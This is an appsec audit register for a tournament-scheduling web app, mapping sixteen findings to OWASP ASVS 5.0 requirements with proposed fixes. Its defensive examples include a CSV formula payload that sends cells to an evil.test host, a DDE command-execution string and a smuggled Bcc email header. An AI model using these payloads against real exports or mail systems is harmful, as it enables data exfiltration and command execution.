# SP-SEC-1 Phase 0 — Security audit findings register

**Date:** 2026-08-05 · **Branch:** `dev/sec-hardening` · **Standard:** OWASP ASVS 5.0.0
**Target:** L1 across the board; L2 for Encoding/Sanitization (V1), Validation (V2), Authentication (V6), Session (V7), Authorization (V8).
**Trigger:** the app is publicly reachable at `shuttleworks.wongworks.dev` behind a Cloudflare Tunnel, `ENVIRONMENT=cloud`, open registration.

Requirement IDs are cited as `v5.0.0-<chapter>.<section>.<requirement>` and were taken
from the machine-readable ASVS 5.0.0 JSON (`OWASP/ASVS`, `5.0/docs_en`), not from memory.

**Status: Phase 0 complete. No remediation code written. Awaiting confirmation + the 0.G decision.**

---

## 1. Threat model applied

In scope: SQL injection, stored XSS incl. derived surfaces (email / public display / exports),
derived-output injection (email headers, CSV formulas, ICS, SSRF), input-validation gaps and
mass assignment, resource exhaustion, enumeration/disclosure, abuse of open registration.

Explicitly out of scope: **prompt injection / LLM attacks — there is no LLM anywhere in the
request path.** CP-SAT is a constraint solver over structured numeric input; there is no model
for user text to be injected into. No "prompt-injection defense" is proposed or needed.
(ASVS 5.0 likewise moved AI concerns to a separate standard, AISVS.)

---

## 2. Method

1. Every write endpoint and every request-body field enumerated **from the running app's OpenAPI
   schema**, not by reading models — 77 paths, 35 with a JSON body. Script:
   `scripts/audit_input_surface.py` (walks `$ref`s, flags unbounded strings, unbounded arrays,
   unbounded numerics, and non-strict models).
2. Injection sinks traced by grep across `products/scheduler/{backend,frontend}` and
   `packages/design-system`.
3. Auth/session/authz read against the ASVS L2 requirement text, requirement by requirement.
4. Deployment surface read from `frontend/nginx.conf`, `docker-compose.selfhost.yml`,
   `.env.selfhost.example`.
5. One behaviour was settled by experiment rather than reasoning (SEC-09) — noted inline.

`scheduler_core/` and `archive/` were read but not modified, and nothing here proposes a change
inside them.

---

## 3. 0.A — Input surface inventory (summary)

Machine-generated detail: the script's output. Headline numbers:

| Measure | Count |
|---|---|
| Endpoints with a JSON request body | 35 |
| **Unbounded string fields** (no `maxLength`, `pattern`, `enum`, or `format`) | **250** |
| Array fields with no `maxItems` | every one of them |
| Model positions accepting-and-ignoring unknown fields (no `extra='forbid'`) | 138 |
| Models that explicitly *allow* extra fields | 1 (`MatchStateDTO`) |

Worst offenders by unbounded-field count:

| Endpoint | Unbounded fields |
|---|---|
| `PUT /tournaments/{id}/state` | 124 |
| `POST /tournaments/{id}/schedule/proposals/repair` | 83 |
| `POST /tournaments/{id}/schedule/proposals/manual-edit` | 80 |
| `POST /tournaments/{id}/schedule/proposals/warm-restart` | 77 |
| `POST /tournaments/{id}/schedule/director-action` | 77 |
| `POST /schedule/validate` | 61 |
| `POST /tournaments/{id}/solve-jobs` | 56 |
| `POST /tournaments/{id}/bracket/import` | 25 |

### Free-text fields and where their values are later rendered

| Field | Bounded? | App (React) | Public display | Email | Export |
|---|---|---|---|---|---|
| `tournaments.name` (`TournamentCreateDTO.name`) | ✅ 200 | ✅ escaped | ✅ `/display/{t}/summary` | ⚠️ **invite Subject header** | — |
| `config.tournamentName` (state blob) | ❌ | ✅ | ✅ board headline | — | — |
| `players[].name` | ❌ | ✅ | ✅ board | — | ⚠️ **CSV**, ICS, XLSX |
| `players[].notes` | ❌ | ✅ | ✅ (projection includes `players`) | — | XLSX |
| `bracketPlayers[].name` / `.notes` | ❌ | ✅ | ✅ `/display/{t}/bracket` | — | ⚠️ **CSV**, ICS, XLSX |
| `groups[].name` | ❌ | ✅ | ✅ board + standings | — | — |
| `matchStates[].notes` | ❌ | ✅ | ✅ `/display/{t}/match-states` | — | — |
| `config.courtClosures[].reason` | ❌ | ✅ | ✅ (`config` is projected) | — | — |
| `config.tvAccent` | ❌ server-side | ✅ (client-side hex regex) | ✅ inline `style` | — | — |
| `users.display_name` | ❌ | ✅ | — | — | — |
| Org name (derived from display name/email) | ✅ 200 (truncation) | ✅ | — | — | — |

The React surfaces are safe by default escaping (see §4 SQL/XSS verification). **The email,
CSV, and ICS columns are where the real work is** — they do not inherit React's escaping.

---

## 4. Verified clean — confirmed, not assumed

| Control | Evidence | ASVS |
|---|---|---|
| **No SQL injection** | Every query goes through the ORM. The only `text()` uses are three static literals (`SELECT 1`, `SELECT version_num FROM alembic_version`, a partial-index predicate, `lower(email)` in an index definition) plus Alembic migrations, one of which uses bound parameters. No string-formatted query anywhere in `api/`, `services/`, `repositories/`, `database/`. | `v5.0.0-1.2.4` ✅ L1 |
| **No DOM XSS sink in the app** | Zero occurrences of `dangerouslySetInnerHTML`, `innerHTML`, `document.write`, `eval(`, or `new Function` across `frontend/src` and `packages/design-system/src`. | `v5.0.0-1.3.2` ✅ |
| **No SSRF surface** | The backend makes no outbound HTTP at all — no `requests`, `httpx`, `urllib`, or `aiohttp` import outside SMTP. There is no user-supplied URL the server fetches. | `v5.0.0-1.3.6` N/A |
| **Email `To:` header is safe** | `normalize_email` rejects any whitespace (`[^@\s]+@[^@\s]+\.[^@\s]+`, ≤320 chars) before the address reaches `send_email`. Newline injection into the recipient is impossible. | `v5.0.0-1.3.11` ✅ (for `To:`; see SEC-09 for `Subject:`) |
| **No path traversal on backup restore** | `POST …/state/restore/{filename}` looks the name up as a **database row** keyed `(tournament_id, filename)`; no filesystem path is ever constructed from it. | `v5.0.0-5.3.2` ✅ |
| **XLSX exports are not formula-injectable** | ExcelJS writes a JS string as a string-typed cell (`t="s"`); only an explicit `{formula: …}` object becomes a formula. Both `xlsxExports.ts` modules assign plain strings. *To be pinned by a test in Phase 2 — this is currently an undocumented dependency on library behaviour.* | `v5.0.0-1.2.10` ✅ |
| **Mass assignment of privilege fields is closed** | No request model exposes `role`, `org_id`, `owner_id`, or `id` on a creatable resource. Ownership is stamped server-side from `get_current_user`; role changes go through owner-gated `PATCH …/members/{user_id}` validated against `members_service.ROLES`. | `v5.0.0-15.3.3` ✅ (for privilege fields — see SEC-12 for the rest) |
| **Tenancy seam** | `require_tournament_access` + uniform 404 for non-members, no bypass mode, derived-from-OpenAPI coverage test (`tests/test_tenant_isolation.py`). | `v5.0.0-8.2.1`, `8.2.2`, `8.3.1` ✅ |
| **Credential handling** | Argon2id (RFC-9106 profile) with opportunistic rehash; opaque 256-bit session tokens stored only as SHA-256; uniform invalid-credential response with a dummy-hash timing equalizer; credential change revokes other sessions; passwords accepted verbatim up to 128 chars with no composition rules. | `v5.0.0-6.2.5`, `6.2.8`, `6.2.9`, `6.2.10`, `7.2.1`–`7.2.4`, `7.5.1` ✅ |
| **Enumeration seams** | Uniform 404 on invites (with query-count equalization, pinned by `test_invite_oracle.py`), always-202 password reset, uniform login failure. | `v5.0.0-6.3.1` ✅ |
| **Ops endpoints gated** | `/health/ready|deep|metrics` require `X-ShuttleWorks-Ops-Token` (`compare_digest` on bytes); cloud profile refuses to boot without it. DB errors reduced to the exception class name so the DSN cannot leak. | `v5.0.0-16.5.1` ✅ (for health) |

---

## 5. Findings register — risk-ordered

Severity weighs impact × exploitability **given public exposure today**.

### SEC-01 — No request-body size limit at the origin; every collection and string field is unbounded
**Severity: High · Exploitability: Trivial (any authenticated user; registration is open)**
`v5.0.0-2.2.1` L1 · `v5.0.0-2.2.2` L1 · `v5.0.0-13.1.2`

No `client_max_body_size` is set in either `nginx.conf`, and uvicorn imposes no limit, so the
origin's only ceiling is nginx's 1 MB default — which applies **only** to requests that traverse
the SPA container. Cloudflare caps at 100 MB. Independently, 250 string fields and every array
field in the API accept arbitrary size.

The amplifier is `PUT /tournaments/{id}/state`: it accepts the whole state blob, and
`commit_tournament_state` **snapshots the prior blob into `tournament_backups` on every write**
before storing the new one. A loop of large PUTs multiplies storage by the retention count and
drives the per-match projection over an attacker-sized `matches` array. Separately,
`POST …/solve-jobs` snapshots its whole input into the job row and hands unbounded
`players`/`matches` lists to CP-SAT.

**Fix:** a body-size middleware at the origin (deliberately sized against the largest legitimate
state blob, not left at nginx's default), plus `max_length` on every string and `max_items` on
every collection, applied as one boundary layer rather than per-handler.

---

### SEC-02 — Security headers are absent on every HTML response (nginx `add_header` inheritance)
**Severity: High · Exploitability: Requires a second bug to chain, but removes a whole defense layer**
`v5.0.0-3.4.3` L2 (CSP) · `v5.0.0-3.4.4` L2 (nosniff) · `v5.0.0-3.4.5` L2 (Referrer-Policy) · `v5.0.0-3.4.6` L2 (frame-ancestors)

`frontend/nginx.conf` declares `X-Frame-Options`, `X-Content-Type-Options`, and
`X-XSS-Protection` at **server** level. nginx's rule: `add_header` directives are inherited from
the enclosing level **only if the current level declares none of its own**. `location /`,
`location = /index.html`, and `location /assets/` each declare their own cache-control
`add_header`s — so all three security headers are **dropped for exactly those responses**, i.e.
for the SPA HTML and the JS bundle. They survive only on `location /api/`, which declares no
`add_header` — the one place they matter least. The headers are, in effect, applied backwards.

Also missing entirely, at every level: `Content-Security-Policy`, `Referrer-Policy`,
`Permissions-Policy`, and HSTS at the origin. `X-XSS-Protection` is deprecated and should be
removed rather than kept. `docs/nginx.conf` has the identical defect.

**Fix:** move the security headers into a snippet `include`d by every `location`, or restate them
per-location; add CSP (calibrated to the SPA — inline `style` attributes are used by the display
board), `Referrer-Policy`, `frame-ancestors`, HSTS; drop `X-XSS-Protection`.
**Rule 6 applies: verify on real cayde responses, not only in a unit test.**

---

### SEC-03 — Open registration has no anti-automation; only *failed* registrations are throttled
**Severity: High · Exploitability: Trivial, unauthenticated**
`v5.0.0-2.4.1` L2 · `v5.0.0-6.1.1` L1

`POST /auth/register` calls `_throttle_guard(repo, ip_key)` and records a failure **only in the
`except AuthError` branch**. A *successful* registration records nothing, so the throttle never
engages on the path that actually consumes resources. From one IP an attacker can create
unlimited accounts; each gets a `users` row, a personal `orgs` row, and an `org_members` row.

Each account can then create unlimited workspaces. The one-active-job-per-tournament partial
unique index bounds concurrency *per tournament*, not per user — and the shipped worker runs
`worker_concurrency = 1`, so N queued jobs across N attacker-owned workspaces starve every
legitimate solve behind them. There is no global rate limit anywhere in the stack: no
`limit_req` in nginx, no rate-limiting middleware, no dependency.

**Fix:** count successful registrations against the IP bucket; add a per-user cap on concurrent
queued solve jobs; add `limit_req` at the edge. See 0.G for the registration-model decision.

---

### SEC-04 — Interactive API documentation is public
**Severity: Medium · Exploitability: Trivial, unauthenticated**
`v5.0.0-13.4.5` L2

`FastAPI(...)` is constructed without `docs_url=None` / `redoc_url=None` / `openapi_url=None`,
and those three routes carry no auth dependency. `https://shuttleworks.wongworks.dev/docs`,
`/redoc`, and `/openapi.json` therefore publish the complete route table and every request/response
schema for all 77 paths to anyone. This is not a vulnerability by itself; it is a free, complete
map for anyone probing the other findings, and ASVS L2 calls it out explicitly.

**Fix:** disable in cloud mode (`ENVIRONMENT == "cloud"`), or gate behind `OPS_TOKEN` like the
health tree. Keep them on in local mode — they are genuinely useful there.

---

### SEC-05 — CSV formula injection in the bracket order-of-play export
**Severity: Medium · Exploitability: Moderate (needs a victim to open the file)**
`v5.0.0-1.2.10` (L3 — above our target level, but a live exploit path, so remediating)

`services/bracket/io/export_schedule.py::to_csv` writes participant names straight into the
`side_a` / `side_b` cells. `csv.writer` quotes correctly (so the *file structure* is safe) but
does nothing about leading `=`, `+`, `-`, `@`, TAB, or CR — Excel and LibreOffice evaluate those
as formulas on open. A participant named `=HYPERLINK("https://evil.test/?"&A1,"Results")`
exfiltrates neighbouring cells when the director opens the export; `=cmd|'/c calc'!A0` is the
DDE variant. Names are attacker-controllable by any operator-role member of the workspace and by
CSV roster import.

**Fix:** prefix a dangerous leading character with `'` (or wrap the value) per RFC 4180 §2.6–2.7
guidance, at the single `to_csv` writer. Negative control: remove the prefixing → the payload
lands in the cell.

---

### SEC-06 — Exception strings reach clients in several error responses
**Severity: Medium · Exploitability: Trivial for an authenticated member**
`v5.0.0-16.5.1` L2

Three patterns, in increasing order of concern:

1. `api/tournaments.py::restore_tournament_backup` — `except Exception as e: … f"restore failed: {e}"`
   returned in a **500** body. Whatever the exception is (SQLAlchemy, OSError, JSON), its `str()`
   goes to the client; a SQLAlchemy connection error's `str()` carries the DSN. This is the exact
   class of leak the 2026-08-04 audit already fixed once in `/health/ready`.
2. `api/brackets.py:1832` — the SSE solve stream does `except Exception as exc: error_holder["error"] = str(exc)`
   and emits it to the browser.
3. ~12 sites of `raise HTTPException(400, detail=str(exc))`. Most catch a narrow `ValueError`
   from domain code and are fine; the pattern is fragile because widening the `except` silently
   turns them into leaks.

Nothing sensitive is *logged*: the only near-miss (`log.warning("… malformed disruption %s", payload)`)
logs schedule-disruption data, not credentials. Reset and invite tokens are never written to a
cloud log — the cloud profile refuses to boot with the console email backend for exactly that reason.

**Fix:** generic message + request-id to the client, detail to the log, on (1) and (2); narrow
the `except` clauses on (3).

---

### SEC-07 — Password blocklist is 15 entries; ASVS L1 requires the top 3000
**Severity: Medium · Exploitability: Moderate (credential stuffing)**
`v5.0.0-6.2.4` **L1** · `v5.0.0-6.2.12` L2

`services/auth.py::_WORST_PASSWORDS` holds 15 strings. ASVS 5.0 L1 requires checking against at
least the **top 3000** passwords matching the policy; L2 additionally requires a breached-password
set. This is the register's only outright **L1** failure.

Note the related item that is **not** a finding: `password_min_length = 8` is compliant —
`v5.0.0-6.2.1` L1 asks for ≥8 and *recommends* 15. NIST 800-63B **Rev 4** does state 15 as the
single-factor minimum; raising it is a judgement call, not a conformance fix, and it would
invalidate existing accounts. Recommendation: **fold the blocklist fix in (required), keep 8 as
the minimum but raise the recommendation in the UI (not required)**, and log the Rev-4 alignment
as its own decision.

**Fix (Rule 2 — must work offline):** bundle a compressed top-N list in the repo and screen
against it in-process. No network call, no external reputation service, identical behaviour in
local mode.

---

### SEC-08 — ICS export escapes LF but not CR
**Severity: Medium · Exploitability: Moderate**
`v5.0.0-1.3.3` L2

`_ics_escape` replaces `\\`, `,`, `;`, and `\n` — but **not `\r`**. RFC 5545 lines are CRLF-delimited;
a bare CR inside a participant name terminates the `SUMMARY:` property line at that point, letting
the remainder of the name inject arbitrary iCalendar properties or a whole extra `VEVENT` into a
subscriber's calendar. `LOCATION:` and `UID:` are not passed through the escaper at all (their
inputs are server-generated today, so the exposure is latent rather than live).

**Fix:** escape `\r` (and `\r\n`) in `_ics_escape`, route every interpolated value through it, and
fold lines at 75 octets while we're there.

---

### SEC-09 — Workspace name is interpolated into an email `Subject:` header
**Severity: Medium · Exploitability: Trivial for an owner (self-inflicted DoS, not injection)**
`v5.0.0-1.3.11` L2 · `v5.0.0-16.5.3` L2

`api/tournaments.py::create_invite_link` builds
`subject=f"You're invited to {tournament.name or …}"`. `tournament.name` is user-controlled, capped
at 200 chars, and **not newline-stripped**.

Settled by experiment rather than by reasoning, because the answer determines the severity:

```
>>> m = EmailMessage(); m['Subject'] = "You're invited to Evil\nBcc: attacker@evil.test"
ValueError: Header values may not contain linefeed or carriage return characters
```

Python's `email.policy.default` **blocks the injection at header-store time**. So the real outcome
is not a forged `Bcc:` — it is an **unhandled `ValueError` → 500** on invite creation, *after* the
invite row has already been persisted. The security property holds only because of an undocumented
stdlib behaviour that no test in this repo pins.

**Fix:** strip CR/LF from every value interpolated into a header, bound the subject, and add the
test that pins the behaviour (negative control: remove the stripping → the 500 returns).

---

### SEC-10 — Session lifetime controls incomplete
**Severity: Medium · Exploitability: Requires a stolen cookie**
`v5.0.0-7.3.1` L2 (inactivity timeout) · `v5.0.0-7.5.2` L2 (view/terminate sessions)

`auth_sessions` has an absolute 30-day expiry (`v5.0.0-7.3.2` ✅) and a rolling `last_seen_at`
stamp — but `resolve_session` never *enforces* an idle window, so a stolen cookie stays valid for
the full 30 days regardless of use. There is also no way for a user to list or terminate their
other sessions; the only revocation path is a password change.

**Fix:** enforce an idle timeout against `last_seen_at` (the column already exists and is
maintained); a session list/terminate surface is a small, separable follow-up.

---

### SEC-11 — No multi-factor authentication
**Severity: Medium (accepted risk) · `v5.0.0-6.3.3` L2**
Known, and a declared non-goal for this slice. **Logged as an accepted residual risk with a
trigger**: implement before the product holds data for organisations other than the operator's
own, or before any paid/registration-at-scale launch.

---

### SEC-12 — Server-managed state fields are client-writable inside the state blob
**Severity: Medium · Exploitability: Trivial for an operator-role member**
`v5.0.0-15.3.3` L2 · `v5.0.0-8.2.3` L2

`PUT /tournaments/{id}/state` persists the whole `TournamentStateDTO`. `standings` is correctly
stripped, but **`version`, `updatedAt`, `scheduleVersion`, and `scheduleHistory` are not** — a
client can set them to anything. `scheduleVersion` is the optimistic-concurrency token the
proposal-commit path compares `fromScheduleVersion` against, so a client that rewrites it can
defeat the stale-proposal rejection; `scheduleHistory` is the revert pool and can be forged or
erased.

The blast radius is confined to a workspace the caller already has operator rights on, which is
why this is Medium and not High. It **overlaps the lost-update defect owned by SP-CLOUD-4** —
flagging the boundary rather than fixing across it.

Separately, `MatchStateDTO` sets `model_config = {"extra": "allow"}`. Extra keys do not reach the
ORM (`_dto_to_fields` maps explicitly), so this is currently inert, but it is the one model that
opts *into* accepting unknown fields and should be justified or removed.

**Fix:** strip server-managed keys on ingest exactly as `standings` already is; add `extra='forbid'`
as the default posture. **STOP-condition check: no restructuring is needed** — this is an ingest
filter, not a schema change.

---

### SEC-13 — The unauthenticated display plane has no rate limit
**Severity: Low · Exploitability: Trivial, unauthenticated (needs a leaked token)**
`v5.0.0-2.4.1` L2

`/display/{token}/*` is the app's only unauthenticated data plane. `/display/{token}/state`
recomputes Meet standings from the blob **plus a `match_states` query on every request**, with no
cache (unlike `/display/{token}/bracket`, which has one). Anyone holding a display link — a
capability URL that by design gets projected onto a screen in a public sports hall — can drive
that loop as fast as they like. Token *guessing* is not a concern (192-bit `token_urlsafe(24)`).

**Fix:** the same short-TTL response cache the bracket route already uses, plus edge rate limiting.

---

### SEC-14 — `tvAccent` is validated only in the browser
**Severity: Low · `v5.0.0-2.2.2` L1**

`config.tvAccent` is an unvalidated `Optional[str]` server-side and is applied to inline `style`
props on the public display board. The value is currently safe because `resolveTvAccent()` enforces
`/^[0-9a-fA-F]{6}$/` and falls back to a default — but that is a client-side control on a
server-stored value, which is the pattern ASVS L1 says must not be relied on. React's `style` prop
would not execute script from it, so this is defense-in-depth, not a live XSS.

**Fix:** a `pattern` on the Pydantic field.

---

### SEC-15 — `displayName` is unbounded
**Severity: Low · `v5.0.0-2.2.1` L1**

`RegisterRequest.displayName` has no length limit and is stored raw on `users.display_name`.
It is truncated to 200 only when deriving an org name. Rendered in the React app (escaped).

---

### SEC-16 — CSV roster import: unbounded body, unguarded `int()`
**Severity: Low (informational) · `v5.0.0-2.2.1` L1 · `v5.0.0-16.5.3` L2**

`RosterImportDTO.csv` is an unbounded string, and `CSVImporterService.parse_roster_csv` calls
`int(parts[3])` without a guard — a non-numeric column raises an uncaught `ValueError`. Bounded by
SEC-01's body limit once that lands; the `int()` should still be handled and returned as a 400.

---

## 6. Coverage against the target ASVS level

| Chapter | Target | Result |
|---|---|---|
| V1 Encoding and Sanitization | L2 | 3 findings (SEC-05 L3-scope, SEC-08, SEC-09); SQL + SSRF + `To:`-header clean |
| V2 Validation and Business Logic | L2 | 2 findings (SEC-01, SEC-03), + SEC-13/14/15/16 |
| V3 Web Frontend Security | L1 | 1 finding (SEC-02) — L2 header set absent |
| V5 File Handling | L1 | clean (no upload surface; restore is DB-keyed) |
| V6 Authentication | L2 | 2 findings (SEC-07 **L1 failure**, SEC-11 MFA); storage/policy/throttle otherwise conformant |
| V7 Session Management | L2 | 1 finding (SEC-10); token generation, rotation, revocation conformant |
| V8 Authorization | L2 | clean at L1/L2 for function- and data-level; SEC-12 touches field-level (8.2.3) |
| V13 Configuration | L1 | 1 finding (SEC-04) |
| V16 Logging and Error Handling | L2 | 1 finding (SEC-06); nothing sensitive logged |
| V9, V10, V17 | — | N/A: no self-contained tokens, no external IdP, no WebRTC |

---

## 7. 0.G — Registration exposure: decision needed

Anyone on the internet can currently create an account on the staging deployment.

| Option | Effect | Cost |
|---|---|---|
| **(a)** Leave open, add rate limiting | Anyone signs up; abuse is bounded, not prevented. Keeps the eventual public-product shape. | SEC-03's fix; no new UX |
| **(b)** Invite-only registration | Accounts exist only via an org invite. Strongest app-level control. | New flow + a bootstrap path for the first user; changes the product's shape |
| **(c)** Cloudflare Access in front of everything | Nobody reaches the app without passing Cloudflare's identity check first. Already available on the current plan, free, no code. | ~10 minutes of config; the public display link must be excluded by path or it stops working for spectators |

**Recommendation: (c) now, (a) as the target state.**

(c) is the right answer for *today* regardless of the long-term model — the deployment is staging,
it has never been penetration-tested, and every finding in this register is currently reachable by
anyone who finds the hostname. It costs nothing and it is reversible. Do it **before** the Phase
1–3 remediation lands, not after, so the fixes are made under a closed door.

(a) is the right long-term shape: this product's growth story is directors signing themselves up,
and (b) would make that impossible without a separate approval mechanism, i.e. it converts a code
problem into an ops problem. Adopt (b) only if abuse appears after (c) is lifted.

**One caveat on (c):** `/display/{token}/*` and the `/display` SPA route must be excluded from the
Access policy, or every spectator screen at an event breaks. That exclusion needs to be written
into the runbook as a load-bearing detail, not discovered at a tournament.

---

## 8. Proposed phase order (unchanged from the brief, resequenced by risk)

0. **0.G decision + Cloudflare Access** — close the door first.
1. **Phase 1:** SEC-01, SEC-12, SEC-14, SEC-15, SEC-16 (boundary validation + mass assignment + body limit).
2. **Phase 2:** SEC-05, SEC-08, SEC-09 (derived-surface encoding) + the XLSX behaviour test.
3. **Phase 3:** SEC-03, SEC-02, SEC-04, SEC-06, SEC-07, SEC-13 (abuse, headers, disclosure, blocklist).
4. **Phase 4:** cayde verification (Rule 6 — headers, error bodies, limits on real responses), `SECURITY.md`, residual risks (SEC-10 partial, SEC-11).

Every control gets a Rule-5 negative control, recorded in the ledger.

---

## 9. STOP conditions — status

| Condition | Triggered? |
|---|---|
| Evidence of active compromise | **No.** Nothing in the audit suggests the deployment has been attacked. |
| A control that would break local-mode parity | **No.** The one candidate — password breach screening (SEC-07) — is specified as a bundled offline list precisely to avoid it. |
| A heavy new dependency needed | **No.** Every fix is framework-native (Pydantic validators, one ASGI middleware, nginx config, stdlib string handling). The only new asset is a compressed password list, which is data, not a dependency. |
| A mass-assignment vector needing restructuring | **No.** SEC-12 is an ingest filter. |
